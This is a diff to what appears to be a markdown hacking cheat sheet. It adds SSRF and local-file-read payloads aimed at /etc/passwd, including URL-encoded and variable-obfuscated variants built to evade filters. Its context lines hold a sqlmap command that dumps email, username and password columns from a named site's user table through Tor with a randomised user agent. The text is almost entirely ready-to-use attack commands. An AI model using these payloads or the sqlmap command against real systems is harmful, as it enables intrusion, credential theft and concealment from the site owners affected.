@@ -303,6 +303,20 @@ sqlmap.py -url www.site.ps/index.php --level 5 --risk 3 tamper=apostrophemask,ap
  
 --tamper "randomcase.py" --tor --tor-type=SOCKS5 --tor-port=9050 --dbs --dbms "MySQL" --current-db --random-agent -D "pache_PACHECOCARE" -T "edt_usuarios" -C "ud,email,usuario,contra" --dump
 ```
+ 
+### SSRF Payloads for LFR/LFD
+
+```
+file:/etc/passwd%3F/
+file:/etc%252Fpasswd/
+file:/etc%252Fpasswd%3F/
+file:///etc/%3F/../passwd
+file:${br}/et${u}c%252Fpas${te}swd%3F/
+file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
+
+SSRF POLYGLOT
+file:///etc/passwd?/../passwd
+```
 
 ### SQL injection
 ```
